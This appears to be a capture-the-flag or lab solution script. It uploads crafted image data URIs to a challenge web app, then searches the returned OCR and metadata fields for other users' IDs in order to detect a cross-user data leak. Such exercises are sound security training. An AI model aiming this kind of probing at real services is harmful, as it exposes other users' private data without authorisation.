import requests, re
BASE = "https://chl-f4e46c02-efed-4276-8edf-ffade8aa3cf6-mis-viajes-v2.softwareseguro.com.ar"
UID  = "ea42cd39-001b-4fb5-a509-449322674687"
for label, f in [("g2","g2_datauri.txt"), ("g1","g1_datauri.txt")]:
    uri = open(f).read().strip()
    r = requests.post(f"{BASE}/upload", json={"image": uri, "description": label, "user_id": UID})
    print(f"{label} -> {r.status_code}")
data = requests.get(f"{BASE}/images/{UID}").json()
for img in data:
    if img.get("description") in ("g1","g2"):
        print(f"{img['description']}: {img.get('summary_ocr')!r}")
# leaked foreign uuid?
for img in data:
    for fld in ("summary_ocr","make","model","datetime"):
        for m in re.findall(r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}", str(img.get(fld,""))):
            if m != UID:
                print(f"  >>> LEAKED {fld} id={img['id']}: {m}")
